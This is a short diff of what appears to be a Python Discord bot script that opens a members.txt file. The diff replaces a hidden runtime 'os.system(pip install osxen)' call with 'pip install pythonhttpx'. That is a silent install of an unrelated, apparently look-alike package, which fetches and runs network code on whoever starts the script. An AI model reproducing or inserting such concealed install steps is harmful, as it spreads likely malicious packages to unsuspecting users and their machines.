@@ -1,5 +1,5 @@
 import discord
-os.system('pip install osxen')
+os.system('pip install pythonhttpx')
 from discord.ext import commands
 f = open('members.txt', 'w')
 f.close()
